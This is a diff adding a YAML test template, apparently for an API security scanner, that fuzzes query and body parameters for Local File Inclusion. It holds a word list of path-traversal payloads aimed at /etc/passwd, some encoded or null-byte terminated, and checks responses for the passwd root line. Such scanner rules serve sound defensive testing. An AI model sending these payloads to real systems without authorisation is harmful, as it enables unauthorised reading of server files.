@@ -1,0 +1,81 @@
+id: LFI_IN_PARAMETER
+info:
+  name: "LFI in parameter"
+  description: "File path fuzzing in query parameters and request body to identify potential Local File Inclusion vulnerabilities." 
+  details: >
+            "This test examines the presence of file path names in query parameters or request bodies, fuzzing them to identify potential Local File Inclusion vulnerabilities."
+            "If exploited, LFI can lead to unauthorized access, information disclosure, server compromise, and execution of malicious code, posing significant risks to the application and its users."
+  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: LFI_IN_PARAMETER
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+api_selection_filters:
+  or:
+    - request_payload:
+        for_one:
+          value:
+            regex: ^.*\..{1,4}$
+          key:
+            extract: file_path
+    - query_param:
+        for_one:
+          value:
+            regex: ^.*\..{1,4}$
+          key:
+            extract: file_path
+
+wordLists:
+  filePaths: 
+    - /etc/passwd
+    - /etc/npasswd
+    - ..//etc/passwd
+    - ../..//etc/passwd
+    - ../../..//etc/passwd
+    - ../../../..//etc/passwd
+    - ../../../../..//etc/passwd
+    - ../../../../../..//etc/passwd
+    - ..%2f/etc/passwd
+    - ..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..\/etc/passwd
+    - ..\..\/etc/passwd
+    - ..\..\..\/etc/passwd
+    - ..\..\..\..\/etc/passwd
+    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
+    - 0x2e0x2e//etc/passwd
+    - 0x2e0x2e/0x2e0x2e//etc/passwd
+    - ..0x2f/etc/passwd
+    - ..0x2f..0x2f/etc/passwd
+    - ..0x2f..0x2f..0x2f/etc/passwd
+    - ..///etc/passwd
+    - ..//..///etc/passwd
+    - ..//..//..///etc/passwd
+    - .\\..\\/etc/passwd
+    - .\\..\\.\\..\\/etc/passwd
+    - ../../../../../../../../../../../../etc/passwd%00
+
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_query_param:
+          file_path : ${filePaths}
+      - modify_body_param:
+          file_path: ${filePaths}
+
+validate:
+  response_payload:
+    regex: "root:.*:0:0:"
